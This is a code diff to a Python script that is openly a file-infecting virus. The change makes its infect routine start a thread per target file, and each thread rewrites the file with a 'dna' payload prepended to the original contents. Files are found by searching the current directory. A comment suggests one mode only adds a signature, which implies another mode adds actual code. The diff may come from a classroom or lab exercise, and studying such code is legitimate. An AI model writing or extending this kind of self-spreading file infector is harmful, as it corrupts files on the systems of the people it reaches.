@@ -29,14 +29,23 @@ def infect(filesToInfect):
 		dna=SIGNATURE # only marks the files with the signature, no actual code added
 	try:
 		for fti in filesToInfect:
-			f=open(fti)
-			buffer=f.read()
-			f.close()
-			f=open(fti,"w")
-			f.write(dna+buffer)
-			f.close()
+			t=threading.Thread(target=handleFileInfection,args=(fti,dna))
+			t.start()
 	except:
 		pass
+
+def handleFileInfection(fileToInfect,dna):
+	try:
+		f=open(fileToInfect)
+		buffer=f.read()
+		f.close()
+		f=open(fileToInfect,"w")
+		f.write(dna+buffer)
+		f.close()
+	except:
+		# try to close file
+		if not f.closed:
+			f.close()
 		
 def isInfected(fullName):
 	# check if file 'fullName' is already infected or not
@@ -93,13 +102,15 @@ def notInfected(str):
 	
 def main():
 	print("\n[before infection]")
-	infect(search("./"))
+	filesToInfect=search("./")
+	infect(filesToInfect)
 	# check again after infection
 	print("\n[after infection]")
 	search("./")
 		
 if __name__=="__main__":
 	import os
+	import threading
 	import datetime
 	import colorama
 	from colorama import Fore,Back,Style
